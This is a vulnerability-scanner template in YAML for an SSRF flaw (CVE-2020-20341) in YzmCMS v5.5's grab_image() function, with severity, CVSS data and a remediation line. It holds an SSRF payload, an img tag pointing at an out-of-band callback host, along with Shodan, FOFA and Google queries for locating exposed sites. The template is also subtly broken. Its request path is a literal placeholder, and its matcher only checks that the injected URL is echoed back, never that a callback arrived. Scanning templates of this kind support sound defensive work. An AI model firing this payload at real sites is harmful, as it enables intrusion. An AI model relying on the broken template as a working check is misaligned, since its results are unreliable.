id: CVE-2020-20341

info:
  name: SSRF in YzmCMS v5.5 grab_image() function
  author: ProjectDiscoveryAI
  severity: high
  description: YzmCMS v5.5 contains a server-side request forgery (SSRF) in the grab_image() function, which can be exploited by inserting a malicious image source URL in the article content.
  impact: |
    Remote attackers can exploit this vulnerability to access internal resources and potentially pivot to further attacks.
  remediation: |
    Update YzmCMS to version 5.6 or later to mitigate the SSRF vulnerability in the grab_image() function.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2020-20341
    cwe-id: CWE-918
    epss-score: 0.00307
    epss-percentile: 0.70592
    cpe: cpe:2.3:a:yzmcms:yzmcms:5.5:*:*:*:*:*:*:*
  metadata:
    vendor: yzmcms
    product: yzmcms
    shodan-query: http.title:"YzmCMS"
    fofa-query: title="YzmCMS"
    google-query: intitle:"yzmcms"

http:
  - method: POST
    path:
      - "{{BaseURL}}/path/to/article/edit/or/create"

    headers:
      Content-Type: application/x-www-form-urlencoded

    body: "articleContent=<img src='http://{{interactsh-url}}/2.jpg' width='100' height='100'/>"
    matchers:
      - type: word
        words:
          - "http://{{interactsh-url}}/2.jpg"
        part: body
